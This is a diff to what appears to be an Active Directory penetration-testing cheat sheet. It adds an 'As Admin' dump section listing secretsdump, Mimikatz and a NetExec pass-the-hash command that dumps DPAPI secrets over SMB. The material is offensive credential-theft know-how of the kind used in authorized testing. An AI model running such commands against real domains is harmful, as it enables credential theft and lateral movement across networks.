@@ -143,10 +143,18 @@ cat *_Certipy.txt | grep ESC
 
 
 
-## Dump
+## As Admin
+
+### Dump
 
 * impacket-secretsdump
 * Mimikatz
+* DPAPI with NetExec
+
+```bash
+# with Pass-the-Hash
+nxc smb DOMAIN -u administrator -H 'REDACTED' --dpapi
+```
 
 When we have a hash we can:
 
